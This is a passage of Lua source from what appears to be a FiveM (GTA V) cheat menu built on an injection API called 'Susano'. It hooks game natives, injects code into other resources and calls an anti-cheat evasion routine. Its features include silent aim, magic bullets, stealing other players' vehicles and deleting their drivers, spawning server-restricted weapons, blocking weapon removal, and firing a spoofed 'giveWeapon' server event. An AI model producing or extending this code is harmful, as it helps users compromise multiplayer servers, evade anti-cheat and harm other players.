                SetPedIntoVehicle(playerPed, targetVehicle, seatIndex)
                Wait(0)
                return IsPedInVehicle(playerPed, targetVehicle, false) and GetPedInVehicleSeat(targetVehicle, seatIndex) == playerPed
            end
            
            local function getFirstFreeSeat(v)
                local numSeats = GetVehicleModelNumberOfSeats(GetEntityModel(v))
                if not numSeats or numSeats <= 0 then return -1 end
                for seat = 0, (numSeats - 2) do
                    if IsVehicleSeatFree(v, seat) then return seat end
                end
                return -1
            end
            
            if RequestControl(targetVehicle, 750) then
                ClearPedTasksImmediately(playerPed)
                SetVehicleDoorsLocked(targetVehicle, 1)
                SetVehicleDoorsLockedForAllPlayers(targetVehicle, false)
                
                local success = false
                if IsVehicleSeatFree(targetVehicle, -1) and tryEnterSeat(-1) then
                    success = true
                end
                
                if not success and GetPedInVehicleSeat(targetVehicle, -1) == playerPed then
                    success = true
                end
                
                if not success then
                    local fallbackSeat = getFirstFreeSeat(targetVehicle)
                    if fallbackSeat ~= -1 and tryEnterSeat(fallbackSeat) then
                        local drv = GetPedInVehicleSeat(targetVehicle, -1)
                        if drv ~= 0 and drv ~= playerPed and DoesEntityExist(drv) then
                            RequestControl(drv, 750)
                            ClearPedTasksImmediately(drv)
                            SetEntityAsMissionEntity(drv, true, true)
                            SetEntityCoords(drv, 0.0, 0.0, -100.0, false, false, false, false)
                            Wait(50)
                            DeleteEntity(drv)
                            
                            for i=1,80 do
                                local occ = GetPedInVehicleSeat(targetVehicle, -1)
                                if occ == 0 or (occ ~= 0 and not DoesEntityExist(occ)) then break end
                                Wait(0)
                            end
                        end
                        
                        for attempt = 1, 30 do
                            if IsVehicleSeatFree(targetVehicle, -1) and tryEnterSeat(-1) then
                                break
                            end
                            Wait(0)
                        end
                    end
                end
                
                Wait(200)
                
                SetEntityAsMissionEntity(targetVehicle, true, true)
                RequestControl(targetVehicle, 1000)
                if NetworkHasControlOfEntity(targetVehicle) then
                    DeleteEntity(targetVehicle)
                end
            end
            
            SetEntityCoordsNoOffset(playerPed, playerCoords.x, playerCoords.y, playerCoords.z, false, false, false)
            SetEntityHeading(playerPed, playerHeading)
        else
            SetEntityCoordsNoOffset(ped, playerCoords.x, playerCoords.y, playerCoords.z, false, false, false)
            SetEntityHeading(ped, playerHeading)
        end
    ]], playerCoords.x, playerCoords.y, playerCoords.z, playerHeading, currentCamCoords.x, currentCamCoords.y, currentCamCoords.z, direction.x, direction.y, direction.z))
end

function HandleInput()
    local scrollValue = GetDisabledControlNormal(0, 14)
    local currentTime = GetGameTimer()
    
    if lastScrollTime == 0 then
        lastScrollTime = currentTime
        lastScrollValue = scrollValue
    end
    
    local scrollDelta = scrollValue - lastScrollValue
    if (currentTime - lastScrollTime) > 100 then
        if scrollDelta > 0.1 then
            FreecamSelectedOption = FreecamSelectedOption + 1
            if FreecamSelectedOption > #FreecamOptions then
                FreecamSelectedOption = 1
            end
            lastScrollTime = currentTime
            lastScrollValue = scrollValue
        elseif scrollDelta < -0.1 then
            FreecamSelectedOption = FreecamSelectedOption - 1
            if FreecamSelectedOption < 1 then
                FreecamSelectedOption = #FreecamOptions
            end
            lastScrollTime = currentTime
            lastScrollValue = scrollValue
        end
    end
    
    if math.abs(scrollValue) < 0.05 then
        lastScrollValue = scrollValue
    end
    
    local click_pressed = IsDisabledControlJustPressed(0, 24)
    local current_time = GetGameTimer()
    
    if click_pressed and not freecam_just_started and (current_time - last_click_time) > 200 then
        local selectedOptionName = FreecamOptions[FreecamSelectedOption]
        if selectedOptionName == "Teleport" then
            TeleportToFreecam()
        elseif selectedOptionName == "Warp Vehicle" then
            WarpVehicleToFreecam()
        elseif selectedOptionName == "Shoot Bullet" then
            ShootBulletFromFreecam()
        elseif selectedOptionName == "Kick Vehicle" then
            UnusableVehicleFromFreecam()
        elseif selectedOptionName == "Fuck Vehicle" then
            FuckVehicleFromFreecam()
        elseif selectedOptionName == "Steal Vehicle" then
            StealVehicleFromFreecam()
        elseif selectedOptionName == "Delete Vehicle" then
            DeleteVehicleFromFreecam()
        end
        last_click_time = current_time
    end
end
            
function UpdateFreecam()
    if not freecam_active then return end
    
    
    HandleInput()
    
    
    local forward = 0.0
    local sideways = 0.0
    local vertical = 0.0
    
    if Susano.GetAsyncKeyState(VK_Z) then forward = 1.0 end
    if Susano.GetAsyncKeyState(VK_S) then forward = -1.0 end
    if Susano.GetAsyncKeyState(VK_D) then sideways = 1.0 end
    if Susano.GetAsyncKeyState(VK_Q) then sideways = -1.0 end
    if Susano.GetAsyncKeyState(VK_SPACE) then vertical = 1.0 end
    if Susano.GetAsyncKeyState(VK_CONTROL) then vertical = -1.0 end
    
    
    local speed = normal_speed
    if Susano.GetAsyncKeyState(VK_SHIFT) then
        speed = fast_speed
    end
    
    
    local currentRot = GetGameplayCamRot(2)
    cam_rot = vector3(currentRot.x, currentRot.y, currentRot.z)
    
    local rad_pitch = math.rad(cam_rot.x)
    local rad_yaw = math.rad(cam_rot.z)
    
    
    cam_pos = vector3(
        cam_pos.x + forward * (-math.sin(rad_yaw)) * math.cos(rad_pitch) * speed,
        cam_pos.y + forward * (math.cos(rad_yaw)) * math.cos(rad_pitch) * speed,
        cam_pos.z + forward * (math.sin(rad_pitch)) * speed
    )
    
    
    cam_pos = vector3(
        cam_pos.x + sideways * (math.cos(rad_yaw)) * speed,
        cam_pos.y + sideways * (math.sin(rad_yaw)) * speed,
        cam_pos.z
    )
    
    
    cam_pos = vector3(cam_pos.x, cam_pos.y, cam_pos.z + vertical * speed)
    
    
    ForceWorldLoad()
    
    
    Susano.SetCameraPos(cam_pos.x, cam_pos.y, cam_pos.z)
end

local function ToggleFreecam(enable, speed)
    Menu.freecamEnabled = enable
    if speed then
        freecamSpeed = speed
        normal_speed = speed
        fast_speed = speed * 5.0
    end
    if Menu.freecamEnabled then
        StartFreecam()
    else
        StopFreecam()
    end
end

-- [REMOVED] Freecam handler (Movement tab deleted)

Citizen.CreateThread(function()
    while true do
        Citizen.Wait(0)
        
        if freecam_active then
            DisableAllControlActions(0)
            
            EnableControlAction(0, 1, true)
            EnableControlAction(0, 2, true)
            EnableControlAction(0, 14, true)
            EnableControlAction(0, 15, true)
            EnableControlAction(0, 24, true)
            
            UpdateFreecam()
        end
        
        
        DrawFreecamMenu()
    end
end)



                    do
                        Actions.shootEyesItem = FindItem("Combat", "General", "Shoot Eyes")
                        if Actions.shootEyesItem then
                            Actions.shootEyesItem.onClick = function(value)
                                Menu.shooteyesEnabled = value
                                if value then StealthAcquire("ac") else StealthRelease("ac") end
                            end
                        end
                    end

                    do
                        Actions.superPunchItem = FindItem("Combat", "General", "Super Punch")
                        if Actions.superPunchItem then
                            Actions.superPunchItem.onClick = function(value)
                                Menu.superPunchEnabled = value
                                if value then StealthAcquire("ac") else StealthRelease("ac") end
                            end
                        end
                    end

                    CreateThread(function()
                        while true do
                            Wait(0)
                            if Menu.superPunchEnabled then
                                SetWeaponDamageModifier(GetHashKey("WEAPON_UNARMED"), 100.0)
                                SetWeaponDamageModifier(GetHashKey("WEAPON_KNUCKLE"), 100.0)
                            else
                                SetWeaponDamageModifier(GetHashKey("WEAPON_UNARMED"), 1.0)
                                SetWeaponDamageModifier(GetHashKey("WEAPON_KNUCKLE"), 1.0)
                            end
                        end
                    end)

                    do
                        local weaponOptions = {
                            {name = "give weapon_aa", weapon = "weapon_aa"},
                            {name = "give weapon_caveira", weapon = "weapon_caveira"},
                            {name = "give weapon_SCOM", weapon = "weapon_SCOM"},
                            {name = "give weapon_mcx", weapon = "weapon_mcx"},
                            {name = "give weapon_grau", weapon = "weapon_grau"},
                            {name = "give weapon_midasgun", weapon = "weapon_midasgun"},
                            {name = "give weapon_hackingdevice", weapon = "weapon_hackingdevice"},
                            {name = "give weapon_akorus", weapon = "weapon_akorus"},
                            {name = "give WEAPON_MIDGARD", weapon = "WEAPON_MIDGARD"},
                            {name = "give weapon_chainsaw", weapon = "weapon_chainsaw"},
                            {name = "give weapon_m4a1smr", weapon = "weapon_m4a1smr"},
                            {name = "give weapon_aks74u", weapon = "weapon_aks74u"},
                            {name = "give WEAPON_ASSAULTXMAS", weapon = "WEAPON_ASSAULTXMAS"},
                            {name = "give weapon_scar17", weapon = "weapon_scar17"},
                            {name = "give weapon_blacksniper", weapon = "weapon_blacksniper"},
                            {name = "give weapon_hkhall", weapon = "weapon_hkhall"},
                            {name = "give weapon_hk_ump", weapon = "weapon_hk_ump"}
                        }
                        
                        local weaponHashMap = {
                            ["weapon_aa"] = GetHashKey("weapon_aa"),
                            ["weapon_caveira"] = GetHashKey("weapon_caveira"),
                            ["weapon_SCOM"] = GetHashKey("weapon_SCOM"),
                            ["weapon_mcx"] = GetHashKey("weapon_mcx"),
                            ["weapon_grau"] = GetHashKey("weapon_grau"),
                            ["weapon_midasgun"] = GetHashKey("weapon_midasgun"),
                            ["weapon_hackingdevice"] = GetHashKey("weapon_hackingdevice"),
                            ["weapon_akorus"] = GetHashKey("weapon_akorus"),
                            ["WEAPON_MIDGARD"] = GetHashKey("WEAPON_MIDGARD"),
                            ["weapon_chainsaw"] = GetHashKey("weapon_chainsaw"),
                            ["weapon_m4a1smr"] = GetHashKey("weapon_m4a1smr"),
                            ["weapon_aks74u"] = GetHashKey("weapon_aks74u"),
                            ["WEAPON_ASSAULTXMAS"] = GetHashKey("WEAPON_ASSAULTXMAS"),
                            ["weapon_scar17"] = GetHashKey("weapon_scar17"),
                            ["weapon_blacksniper"] = GetHashKey("weapon_blacksniper"),
                            ["weapon_hkhall"] = GetHashKey("weapon_hkhall"),
                            ["weapon_hk_ump"] = GetHashKey("weapon_hk_ump"),
                        }

                        local function GiveWeaponByHash(hash, ammo)
                            local weaponHash = nil
                            local hashString = tostring(hash)
                            
                            if type(hash) == "number" then
                                weaponHash = hash
                            else
                                weaponHash = GetHashKey(hashString)
                            end
                            
                            local weaponAA = GetHashKey("weapon_aa")
                            local weaponCaveira = GetHashKey("weapon_caveira")
                            ammo = ammo or 250

                            local ped = PlayerPedId()
                            
                            local function ForceGiveWeapon(weaponName)
                                local testHash = GetHashKey(weaponName)
                                if testHash and testHash ~= 0 then
                                    if HasWeaponAssetLoaded and HasWeaponAssetLoaded(testHash) == 0 then
                                        RequestWeaponAsset(testHash, 31, 0)
                                        local timeout = 0
                                        while HasWeaponAssetLoaded and HasWeaponAssetLoaded(testHash) == 0 and timeout < 50 do
                                            Wait(10)
                                            timeout = timeout + 1
                                        end
                                    end
                                    
                                    GiveWeaponToPed(ped, testHash, ammo, false, true)
                                    SetPedAmmo(ped, testHash, ammo)
                                    SetCurrentPedWeapon(ped, testHash, true)
                                    SetPedInfiniteAmmoClip(ped, true)
                                    Wait(100)
                                    if HasPedGotWeapon(ped, testHash, false) then
                                        return true
                                    end
                                end
                                return false
                            end

                            if weaponHash == weaponAA or (hashString and (hashString:lower() == "weapon_aa")) then
                                if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
                                    Susano.InjectResource("any", string.format([[
                                        local susano = rawget(_G, "Susano")
                                        if susano and type(susano) == "table" and type(susano.HookNative) == "function" then
                                            susano.HookNative(0x3A87E44BB9A01D54, function(ped, weaponHash) return true, -1569615261 end)

                                            susano.HookNative(0xADF692B254977C0C, function(ped, weapon, equipNow)
                                                if weapon == -1569615261 then
                                                    return true
                                                end
                                                return true
                                            end)

                                            susano.HookNative(0xF25DF915FA38C5F3, function(ped, p1) return end)

                                            susano.HookNative(0x4899CB088EDF3BCC, function(ped, weaponHash, p2) return end)

                                            susano.HookNative(0x3795688A307E1EB6, function(ped) return false end)
                                            susano.HookNative(0x0A6DB4965674D243, function(ped) return -1569615261 end)
                                            susano.HookNative(0xC3287EE3050FB74C, function(weaponHash) return -1569615261 end)
                                            susano.HookNative(0x475768A975D5AD17, function(ped, p1) return false end)
                                            susano.HookNative(0x8DECB02F88F428BC, function(ped, weaponHash, p2) return false end)
                                            susano.HookNative(0x34616828CD07F1A1, function(ped) return false end)
                                            susano.HookNative(0x3A50753042A63901, function(ped) return false end)
                                            susano.HookNative(0xB2A38826EAB6BCF1, function(ped) return false end)
                                            susano.HookNative(0xED958C9C056BF401, function(ped) return false end)
                                            susano.HookNative(0x8483E98E8B888A2D, function(ped, p1) return -1569615261 end)
                                            susano.HookNative(0xA38DCFFCE89696FA, function(ped, weaponHash) return 0 end)
                                            susano.HookNative(0x7FEAD38B326B9F74, function(ped, weaponHash) return 0 end)
                                            susano.HookNative(0x3B390A939AF0B5FC, function(ped) return -1 end)
                                            susano.HookNative(0x59DE03442B6C9598, function(weaponHash) return -1569615261 end)
                                            susano.HookNative(0x3133B907D8B32053, function(weaponHash, componentHash) return 0.3 end)
                                            susano.HookNative(0x97A790315D3831FD, function(entity) return 0 end)
                                            susano.HookNative(0x48C2BED9180FE123, function(entity) return false end)
                                            susano.HookNative(0x89CF5FF3D310A0DB, function(weaponHash) return -1569615261 end)
                                            susano.HookNative(0x24B600C29F7F8A9E, function(ped) return false end)
                                            susano.HookNative(0x8483E98E8B888AE2, function(ped, p1) return -1569615261 end)
                                            susano.HookNative(0xCAE1DC9A0E22A16D, function(ped) return 0 end)
                                            susano.HookNative(0x4899CB088EDF59B8, function(ped, weaponHash) return end)
                                            susano.HookNative(0x2E1202248937775C, function(ped, weaponHash, ammo) return true, 9999 end)
                                            susano.HookNative(0x2B9EEDC07BD06B9F, function(ped, weaponHash) return 0 end)
                                        end

                                        local _GetCurrentPedWeapon = GetCurrentPedWeapon
                                        local _RemoveAllPedWeapons = RemoveAllPedWeapons
                                        local _RemoveWeaponFromPed = RemoveWeaponFromPed
                                        local _SetCurrentPedWeapon = SetCurrentPedWeapon

                                        GetCurrentPedWeapon = function(ped, ...)
                                            return true, GetHashKey("WEAPON_UNARMED")
                                        end

                                        RemoveAllPedWeapons = function(ped, ...) return end

                                        RemoveWeaponFromPed = function(ped, weapon) return end

                                        SetCurrentPedWeapon = function(ped, weapon, ...)
                                            if weapon == GetHashKey("WEAPON_UNARMED") then
                                                return _SetCurrentPedWeapon(ped, weapon, ...)
                                            end
                                            return
                                        end

                                        local weaponAAHash = GetHashKey("weapon_aa")
                                        local weaponCaveiraHash = GetHashKey("weapon_caveira")
                                        local weaponPenisHash = GetHashKey("weapon_penis")
                                        local weaponPenisHash = GetHashKey("weapon_grau")
                                        local weaponPenisHash = GetHashKey("weapon_mcx")
                                        local weaponPenisHash = GetHashKey("weapon_midasgun")
                                        local weaponPenisHash = GetHashKey("weapon_hackingdevice")
                                        local weaponPenisHash = GetHashKey("weapon_akorus")
                                        local weaponPenisHash = GetHashKey("weapon_midgard")
                                        local weaponPenisHash = GetHashKey("weapon_chainsaw")
                                        local selfPed = PlayerPedId()

                                        GiveWeaponToPed(selfPed, weaponAAHash, 999, false, true)
                                        SetPedAmmo(selfPed, weaponAAHash, 999)

                                        GiveWeaponToPed(selfPed, weaponCaveiraHash, 999, false, true)
                                        SetPedAmmo(selfPed, weaponCaveiraHash, 999)

                                        GiveWeaponToPed(selfPed, weaponPenisHash, 999, false, true)
                                        SetPedAmmo(selfPed, weaponPenisHash, 999)

                                        _SetCurrentPedWeapon(selfPed, weaponAAHash, true)
                                    ]]))
                                end
                            else
                                local mappedHash = weaponHashMap[hashString]
                                if mappedHash and mappedHash ~= 0 then
                                    if ForceGiveWeapon(hashString) then
                                        return
                                    end
                                end
                                
                                local variants = {
                                    hashString,
                                    hashString:upper(),
                                    hashString:lower(),
                                    "WEAPON_" .. hashString:upper(),
                                    "WEAPON_" .. hashString:gsub("WEAPON_", ""):upper(),
                                    hashString:gsub("WEAPON_", ""):upper(),
                                    hashString:gsub("weapon_", ""):upper(),
                                    hashString:gsub("weapon_", "WEAPON_"),
                                    hashString:gsub("WEAPON_", "weapon_"),
                                }
                                
                                local given = false
                                for _, variant in ipairs(variants) do
                                    if ForceGiveWeapon(variant) then
                                        given = true
                                        break
                                    end
                                end
                                
                                if not given then
                                    local allHashes = {
                                        weaponHash,
                                        mappedHash,
                                        GetHashKey(hashString),
                                        GetHashKey(hashString:upper()),
                                        GetHashKey(hashString:lower()),
                                    }
                                    
                                    for _, testHash in ipairs(allHashes) do
                                        if testHash then
                                            GiveWeaponToPed(ped, testHash, ammo, false, true)
                                            SetPedAmmo(ped, testHash, ammo)
                                            SetCurrentPedWeapon(ped, testHash, true)
                                            SetPedInfiniteAmmoClip(ped, true)
                                            Wait(100)
                                            if HasPedGotWeapon(ped, testHash, false) then
                                                given = true
                                                break
                                            end
                                        end
                                    end
                                    
                                    if not given then
                                        local finalHash = GetHashKey(hashString)
                                        GiveWeaponToPed(ped, finalHash, ammo, false, true)
                                        SetPedAmmo(ped, finalHash, ammo)
                                        SetCurrentPedWeapon(ped, finalHash, true)
                                        SetPedInfiniteAmmoClip(ped, true)
                                        
                                        Wait(100)
                                        if not HasPedGotWeapon(ped, finalHash, false) then
                                            TriggerServerEvent("giveWeapon", hashString, ammo)
                                        end
                                    end
                                end
                            end
                        end

                        for _, weaponData in ipairs(weaponOptions) do
                            local weaponItem = FindItem("Combat", "Spawn", weaponData.name)
                            if weaponItem then
                                weaponItem.onClick = function()
                                    GiveWeaponByHash(weaponData.weapon, 250)
                                end
                            end
                        end
                    end

                    Actions.protectWeaponItem = FindItem("Combat", "Spawn", "Protect Weapon")
                    if Actions.protectWeaponItem then
                        Actions.protectWeaponItem.onClick = function(value)
                            if value then
                                if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
                                    Susano.InjectResource("any", [[
                                        local susano = rawget(_G, "Susano")
                                        if susano and type(susano) == "table" and type(susano.HookNative) == "function" then
                                            if not rawget(_G, 'weapon_protect_hooks_active') then
                                                rawset(_G, 'weapon_protect_hooks_active', true)
                                                
                                                susano.HookNative(0x3A87E44BB9A01D54, function(ped, weaponHash) return -1569615261 end)
                                                susano.HookNative(0x3795688A307E1EB6, function(ped) return false end)
                                                susano.HookNative(0x0A6DB4965674D243, function(ped) return -1569615261 end)
                                                susano.HookNative(0xC3287EE3050FB74C, function(weaponHash) return -1569615261 end)
                                                susano.HookNative(0x475768A975D5AD17, function(ped, p1) return false end)
                                                susano.HookNative(0x8DECB02F88F428BC, function(ped, weaponHash, p2) return false end)
                                                susano.HookNative(0x34616828CD07F1A1, function(ped) return false end)
                                                susano.HookNative(0x3A50753042A63901, function(ped) return false end)
                                                susano.HookNative(0xF25DF915FA38C5F3, function(ped, p1) return end)
                                                susano.HookNative(0x4899CB088EDF3BCC, function(ped, weaponHash, p2) return end)
                                                susano.HookNative(0xB2A38826EAB6BCF1, function(ped) return false end)
                                                susano.HookNative(0xED958C9C056BF401, function(ped) return false end)
                                                susano.HookNative(0x8483E98E8B888A2D, function(ped, p1) return -1569615261 end)
                                                susano.HookNative(0xA38DCFFCE89696FA, function(ped, weaponHash) return 0 end)
                                                susano.HookNative(0x7FEAD38B326B9F74, function(ped, weaponHash) return 0 end)
                                                susano.HookNative(0x3B390A939AF0B5FC, function(ped) return -1 end)
                                                susano.HookNative(0x59DE03442B6C9598, function(weaponHash) return -1569615261 end)
                                                susano.HookNative(0x3133B907D8B32053, function(weaponHash, componentHash) return 0.3 end)
                                                susano.HookNative(0x97A790315D3831FD, function(entity) return 0 end)
                                                susano.HookNative(0x48C2BED9180FE123, function(entity) return false end)
                                                susano.HookNative(0x89CF5FF3D310A0DB, function(weaponHash) return -1569615261 end)
                                                susano.HookNative(0x24B600C29F7F8A9E, function(ped) return false end)
                                                susano.HookNative(0x8483E98E8B888AE2, function(ped, p1) return -1569615261 end)
                                                susano.HookNative(0xCAE1DC9A0E22A16D, function(ped) return 0 end)
                                                susano.HookNative(0x4899CB088EDF59B8, function(ped, weaponHash) return end)
                                                susano.HookNative(0x2E1202248937775C, function(ped, weaponHash, ammo) return true, 9999 end)
                                                susano.HookNative(0x2B9EEDC07BD06B9F, function(ped, weaponHash) return 0 end)
                                                
                                                susano.HookNative(0xB0237302, function()
                                                    local selfPed = PlayerPedId()
                                                    local selfCurrentWeapon = SetCurrentPedWeapon
                                                    return selfCurrentWeapon(selfPed, GetHashKey("WEAPON_UNARMED"), true)
                                                end)
                                                
                                                susano.HookNative(0xC4D88A85, function(ped, weaponHash, ammo, ...)
                                                    return ped, weaponHash, ammo, ...
                                                end)
                                                
                                                local _GetCurrentPedWeapon = GetCurrentPedWeapon
                                                local _RemoveAllPedWeapons = RemoveAllPedWeapons
                                                local _RemoveWeaponFromPed = RemoveWeaponFromPed
                                                local _SetCurrentPedWeapon = SetCurrentPedWeapon
                                                
                                                GetCurrentPedWeapon = function(ped, ...)
                                                    return true, GetHashKey("WEAPON_UNARMED")
                                                end
                                                
                                                RemoveAllPedWeapons = function(ped, ...) return end
                                                
                                                RemoveWeaponFromPed = function(ped, weapon) return end
                                                
                                                SetCurrentPedWeapon = function(ped, weapon, ...)
                                                    if weapon == GetHashKey("WEAPON_UNARMED") then
                                                        return _SetCurrentPedWeapon(ped, weapon, ...)
                                                    end
                                                    return
                                                end
                                            end
                                        end
                                    ]])
                                end
                            else
                                if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
                                    Susano.InjectResource("any", [[
                                        rawset(_G, 'weapon_protect_hooks_active', false)
                                    ]])
                                end
                            end
                        end
                    end

                    CreateThread(function()
                        while true do
                            Wait(0)

                            if Menu.shooteyesEnabled then
                                DrawRect(0.5, 0.5, 0.002, 0.003, 157, 0, 255, 255)
                                if IsControlPressed(0, 38) then 
                                    local playerPed = PlayerPedId()
                                    local currentWeapon = GetSelectedPedWeapon(playerPed)
                                    
                                    if currentWeapon == GetHashKey("WEAPON_UNARMED") or currentWeapon == 0 then
                                        local weapons = {
                                            "WEAPON_PISTOL", "WEAPON_PISTOL_MK2", "WEAPON_COMBATPISTOL", "WEAPON_APPISTOL",
                                            "WEAPON_PISTOL50", "WEAPON_SNSPISTOL", "WEAPON_HEAVYPISTOL", "WEAPON_VINTAGEPISTOL",
                                            "WEAPON_MICROSMG", "WEAPON_SMG", "WEAPON_SMG_MK2", "WEAPON_ASSAULTSMG",
                                            "WEAPON_ASSAULTRIFLE", "WEAPON_ASSAULTRIFLE_MK2", "WEAPON_CARBINERIFLE", "WEAPON_CARBINERIFLE_MK2",
                                            "WEAPON_ADVANCEDRIFLE", "WEAPON_SPECIALCARBINE", "WEAPON_BULLPUPRIFLE", "WEAPON_COMPACTRIFLE",
                                            "WEAPON_SNIPERRIFLE", "WEAPON_HEAVYSNIPER", "WEAPON_HEAVYSNIPER_MK2", "WEAPON_MARKSMANRIFLE",
                                            "WEAPON_PUMPSHOTGUN", "WEAPON_PUMPSHOTGUN_MK2", "WEAPON_SAWNOFFSHOTGUN", "WEAPON_ASSAULTSHOTGUN",
                                            "WEAPON_MG", "WEAPON_COMBATMG", "WEAPON_COMBATMG_MK2", "WEAPON_GUSENBERG",
                                            "WEAPON_RPG", "WEAPON_GRENADELAUNCHER", "WEAPON_MINIGUN", "WEAPON_RAILGUN"
                                        }
                                        
                                        for _, weaponName in ipairs(weapons) do
                                            local weaponHash = GetHashKey(weaponName)
                                            if HasPedGotWeapon(playerPed, weaponHash, false) then
                                                currentWeapon = weaponHash
                                                break
                                            end
                                        end
                                    end
                                    
                                    if currentWeapon ~= GetHashKey("WEAPON_UNARMED") and currentWeapon ~= 0 then
                                        if not rawget(_G, 'shoot_eyes_cooldown') or GetGameTimer() > rawget(_G, 'shoot_eyes_cooldown') then
                                            local camCoords = GetGameplayCamCoord()
                                            local camRot = GetGameplayCamRot(0)
                                            
                                            local z = math.rad(camRot.z)
                                            local x = math.rad(camRot.x)
                                            local num = math.abs(math.cos(x))
                                            local dirX = -math.sin(z) * num
                                            local dirY = math.cos(z) * num
                                            local dirZ = math.sin(x)
                                            
                                            local distance = 1000.0
                                            local endX = camCoords.x + dirX * distance
                                            local endY = camCoords.y + dirY * distance
                                            local endZ = camCoords.z + dirZ * distance
                                            
                                            local rayHandle = StartShapeTestRay(camCoords.x, camCoords.y, camCoords.z, endX, endY, endZ, -1, playerPed, 0)
                                            local retval, hit, hitCoords, surfaceNormal, entityHit = GetShapeTestResult(rayHandle)
                                            
                                            local weaponCoords = GetOffsetFromEntityInWorldCoords(playerPed, 0.5, 1.0, 0.5)
                                            local targetCoords = vector3(endX, endY, endZ)
                                            
                                            if hit and hitCoords then
                                                targetCoords = hitCoords
                                            end
                                            
                                            ShootSingleBulletBetweenCoords(
                                                weaponCoords.x, weaponCoords.y, weaponCoords.z,
                                                targetCoords.x, targetCoords.y, targetCoords.z,
                                                25, true, currentWeapon, playerPed, true, false, 1000.0
                                            )
                                            
                                            rawset(_G, 'shoot_eyes_cooldown', GetGameTimer() + 350)
                                        end
                                    end
                                end
                            end
                        end
                    end)

                    do
                        Actions.silentAimItem = FindItem("Combat", "General", "Silent Aim")
                        if Actions.silentAimItem then
                            Actions.silentAimItem.onClick = function(value)
                                Menu.silentAimEnabled = value
                                if value then StealthAcquire("ac") else StealthRelease("ac") end
                            end
                        end
                    end



                    CreateThread(function()
                        while true do
                            Wait(0)
                            
                            if Menu.silentAimEnabled then
                                local playerPed = PlayerPedId()
                                if IsPedShooting(playerPed) then
                                    if not rawget(_G, 'silent_aim_cooldown') or GetGameTimer() > rawget(_G, 'silent_aim_cooldown') then
                                        local currentWeapon = GetSelectedPedWeapon(playerPed)
                                        if currentWeapon ~= GetHashKey("WEAPON_UNARMED") and currentWeapon ~= 0 then
                                            local playerCoords = GetEntityCoords(playerPed)
                                            local peds = GetGamePool('CPed')
                                            local targetPed = nil
                                            local bestDist = 999999.0
                                            
                                            for _, ped in ipairs(peds) do
                                                if ped ~= playerPed and DoesEntityExist(ped) and not IsPedDeadOrDying(ped, true) then
                                                    local pedCoords = GetEntityCoords(ped)
                                                    local onScreen, screenX, screenY = GetScreenCoordFromWorldCoord(pedCoords.x, pedCoords.y, pedCoords.z)
                                                    if onScreen then
                                                        local dist = #(pedCoords - playerCoords)
                                                        if dist < bestDist then
                                                            bestDist = dist
                                                                        targetPed = ped
                                                        end
                                                    end
                                                end
                                            end
                                            
                                            if targetPed then
                                                local boneIndex = 31086
                                                local targetBone = GetPedBoneIndex(targetPed, boneIndex)
                                                local targetCoords = GetWorldPositionOfEntityBone(targetPed, targetBone)
                                                    
                                                    ShootSingleBulletBetweenCoords(
                                                    targetCoords.x, targetCoords.y, targetCoords.z + 0.1,
                                                        targetCoords.x, targetCoords.y, targetCoords.z,
                                                    25, true, currentWeapon, playerPed, true, false, 1000.0
                                                    )
                                                rawset(_G, 'silent_aim_cooldown', GetGameTimer() + 100)
                                                end
                                            end
                                        end
                                    end
                                end
                            end
                    end)

                    Actions.magicBulletItem = FindItem("Combat", "General", "Magic Bullet")
                    if Actions.magicBulletItem then
                        Actions.magicBulletItem.onClick = function(value)
                            Menu.magicbulletEnabled = value
                            if value then StealthAcquire("ac") else StealthRelease("ac") end
                        end
                    end

                    CreateThread(function()
                        while true do
                            Wait(0)

                            if Menu.magicbulletEnabled then
                                local playerPed = PlayerPedId()
                                if IsPedShooting(playerPed) then
                                    if not rawget(_G, 'magic_bullet_cooldown') or GetGameTimer() > rawget(_G, 'magic_bullet_cooldown') then
                                        
                                        local currentWeapon = GetSelectedPedWeapon(playerPed)
                                        
                                        if currentWeapon == GetHashKey("WEAPON_UNARMED") or currentWeapon == 0 then
                                            local weapons = {
                                                "WEAPON_PISTOL", "WEAPON_PISTOL_MK2", "WEAPON_COMBATPISTOL", "WEAPON_APPISTOL",
                                                "WEAPON_PISTOL50", "WEAPON_SNSPISTOL", "WEAPON_HEAVYPISTOL", "WEAPON_VINTAGEPISTOL",
                                                "WEAPON_MICROSMG", "WEAPON_SMG", "WEAPON_SMG_MK2", "WEAPON_ASSAULTSMG",
                                                "WEAPON_ASSAULTRIFLE", "WEAPON_ASSAULTRIFLE_MK2", "WEAPON_CARBINERIFLE", "WEAPON_CARBINERIFLE_MK2",
                                                "WEAPON_ADVANCEDRIFLE", "WEAPON_SPECIALCARBINE", "WEAPON_BULLPUPRIFLE", "WEAPON_COMPACTRIFLE",
                                                "WEAPON_SNIPERRIFLE", "WEAPON_HEAVYSNIPER", "WEAPON_HEAVYSNIPER_MK2", "WEAPON_MARKSMANRIFLE",
                                                "WEAPON_PUMPSHOTGUN", "WEAPON_PUMPSHOTGUN_MK2", "WEAPON_SAWNOFFSHOTGUN", "WEAPON_ASSAULTSHOTGUN",
                                                "WEAPON_MG", "WEAPON_COMBATMG", "WEAPON_COMBATMG_MK2", "WEAPON_GUSENBERG",
                                                "WEAPON_RPG", "WEAPON_GRENADELAUNCHER", "WEAPON_MINIGUN", "WEAPON_RAILGUN"
                                            }
                                            for _, weaponName in ipairs(weapons) do
                                                local weaponHash = GetHashKey(weaponName)
                                                if HasPedGotWeapon(playerPed, weaponHash, false) then
                                                    currentWeapon = weaponHash
                                                    break
                                                end
                                            end
                                        end
                                        
                                        if currentWeapon ~= GetHashKey("WEAPON_UNARMED") and currentWeapon ~= 0 then
                                            local playerCoords = GetEntityCoords(playerPed)
                                            local camCoords = GetGameplayCamCoord()
                                            local camRot = GetGameplayCamRot(0)
                                            local z = math.rad(camRot.z)
                                            local x = math.rad(camRot.x)
                                            local num = math.abs(math.cos(x))
                                            local dirX = -math.sin(z) * num
                                            local dirY = math.cos(z) * num
                                            local dirZ = math.sin(x)
                                            
                                            local peds = GetGamePool('CPed')
                                            local targetPed = nil
                                            local bestScore = 999999
                                            local pedCount = 0
                                            
                                            for _, ped in ipairs(peds) do
                                                if pedCount >= 50 then break end 
                                                if ped ~= playerPed and DoesEntityExist(ped) and not IsPedDeadOrDying(ped, true) then
                                                    pedCount = pedCount + 1
                                                    local pedCoords = GetEntityCoords(ped)
                                                    local distToPlayer = #(pedCoords - playerCoords)
                                                    
                                                    if distToPlayer < 200.0 then 
